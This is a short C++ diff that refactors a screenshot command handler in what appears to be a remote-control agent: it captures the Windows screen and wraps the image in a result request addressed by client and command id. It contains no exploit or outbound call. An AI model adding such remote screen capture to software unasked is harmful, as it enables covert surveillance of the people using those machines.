@@ -18,10 +18,9 @@ std::unique_ptr<IRequest> ScreenshotHandler::handle(std::shared_ptr<BasicCommand
 	std::string bmp_buffer = windows::take_screenshot();
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnProduct, m_client_id},
-		command->get_command_id(),
-		ScreenshotProduct(
+		std::make_unique<ScreenshotProduct>(
 			command->get_command_id(), CommandType::Screenshot,
 			std::move(bmp_buffer)
-		).serialize()
+		)
 	);
 }
